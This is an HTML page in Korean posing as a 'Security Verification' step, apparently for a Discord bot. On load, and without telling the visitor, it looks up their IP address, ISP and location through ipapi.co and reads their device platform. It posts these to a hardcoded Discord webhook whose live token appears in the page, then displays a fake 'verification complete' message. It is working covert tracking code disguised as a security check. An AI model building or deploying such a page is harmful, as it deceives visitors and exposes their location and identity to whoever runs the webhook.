<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script>
        window.onload = async function() {
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');
            // ⚠️ 본인의 디스코드 웹훅 주소를 여기에 입력하세요.
            const webhook = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; 

            if (!code) return;

            // 1. 숫자 IP (IPv4) 및 통신사 정보 강제 수집
            let ipData = { ip: "분석 실패", isp: "알 수 없음", loc: "대한민국" };
            try {
                // IPv4 숫자 주소를 우선적으로 반환하는 보안 API 사용
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                ipData = {
                    ip: d.ip, // '180.83.74.92' 형태
                    isp: d.org || "알 수 없음", // 'LG POWERCOMM' 등
                    loc: d.city || d.region || "대한민국"
                };
            } catch (e) {
                console.error("IP 수집 오류");
            }

            // 2. 운영체제 및 기기 정보 감지
            const osInfo = navigator.platform.includes("Linux arm") ? "Android" : navigator.platform;

            // 3. 웹훅 전송 (이미지 레이아웃과 동일하게 구성)
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공 (Detailed Log)",
                    "color": 3066993,
                    "fields": [
                        { "name": "👤 인증 코드", "value": code, "inline": false },
                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
                        { "name": "📶 통신사 정보", "value": ipData.isp, "inline": true },
                        { "name": "💻 운영체제", "value": osInfo, "inline": true },
                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 12).toUpperCase(), "inline": false },
                        { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
                    ],
                    "footer": { "text": "Hardware ID: " + Math.random().toString(36).substring(2, 10).toUpperCase() },
                    "timestamp": new Date().toISOString()
                }]
            };

            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            // 결과 화면 표시
            document.body.innerHTML = `
                <div style="background:#0b0e14; color:white; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:sans-serif;">
                    <div style="font-size:50px; color:#23a559; margin-bottom:20px;">✔</div>
                    <h1 style="font-size:24px;">인증 완료</h1>
                    <p style="color:#8b949e;">보안 필터링이 끝났습니다. 창을 닫으셔도 좋습니다.</p>
                </div>
            `;
        }
    </script>
</head>
<body style="background:#0b0e14; margin:0;">
</body>
</html>
